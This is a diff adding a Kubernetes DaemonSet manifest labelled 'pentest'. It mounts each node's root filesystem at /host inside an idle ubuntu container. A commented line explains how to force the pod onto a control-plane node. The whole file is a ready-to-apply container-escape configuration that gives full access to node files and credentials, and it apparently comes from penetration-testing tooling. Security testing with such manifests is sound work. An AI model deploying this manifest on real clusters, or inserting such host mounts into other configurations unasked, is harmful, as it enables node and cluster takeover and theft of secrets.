@@ -1,0 +1,32 @@
+apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: hostpath-exec-daemonset
+  labels:
+    app: pentest
+    type: daemonset
+spec:
+  selector:
+    matchLabels:
+      app: pentest
+      type: daemonset
+  template:
+    metadata:
+      labels:
+        app: pentest
+        type: daemonset
+    spec:
+      containers:
+      - name: hostpath-exec-daemonset
+        image: ubuntu
+        volumeMounts:
+        - mountPath: /host
+          name: noderoot
+        command: [ "/bin/sh", "-c", "--" ]
+        args: [ "while true; do sleep 30; done;" ]
+      #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+      volumes:
+      - name: noderoot
+        hostPath:
+          path: /
+      
